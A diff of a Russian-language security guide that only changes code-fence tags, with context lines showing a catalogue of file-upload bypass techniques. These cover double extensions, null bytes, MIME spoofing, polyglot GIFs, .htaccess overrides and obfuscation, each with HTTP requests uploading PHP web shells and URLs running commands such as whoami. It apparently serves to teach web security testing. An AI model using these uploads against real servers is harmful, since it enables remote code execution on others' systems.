@@ -447,7 +447,7 @@ if (in_array($ext, ['jpg', 'png', 'gif'])) {
 **Реальная эксплуатация:**
 
 **1. Прямая загрузка PHP shell:**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -463,7 +463,7 @@ Content-Type: application/octet-stream
 Доступ: http://target.com/uploads/shell.php?cmd=whoami
 
 **2. Обход через двойное расширение:**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -479,7 +479,7 @@ Content-Type: image/jpeg
 Доступ: http://target.com/uploads/shell.php.jpg?cmd=id
 
 **3. Обход через null byte (PHP < 5.3.4):**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -495,7 +495,7 @@ PHP обрезает имя файла после null byte (%00), сохран�
 Доступ: http://target.com/uploads/shell.php?cmd=whoami
 
 **4. Обход через Content-Type manipulation:**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -509,7 +509,7 @@ Content-Type: image/jpeg    <= Подделываем MIME type
 ```
 
 **5. Обход через case-sensitivity (Windows серверы):**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -525,7 +525,7 @@ Windows не различает регистр расширений: .php = .PhP
 Доступ: http://target.com/uploads/shell.PhP?cmd=whoami
 
 **6. Обход через точку в конце:**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -562,7 +562,7 @@ Content-Type: application/octet-stream
 ```
 
 **9. Polyglot файлы (PHP + image):**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -579,7 +579,7 @@ GIF89a    <= Валидный GIF header
 Доступ: /uploads/avatar.gif?c=whoami
 
 **10. .htaccess upload для изменения конфигурации:**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
@@ -595,7 +595,7 @@ AddType application/x-httpd-php .jpg
 Затем загружаем shell.jpg с PHP кодом → выполняется.
 
 **11. Web shell обфускация:**
-```http
+```text
 POST /upload.php HTTP/1.1
 Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
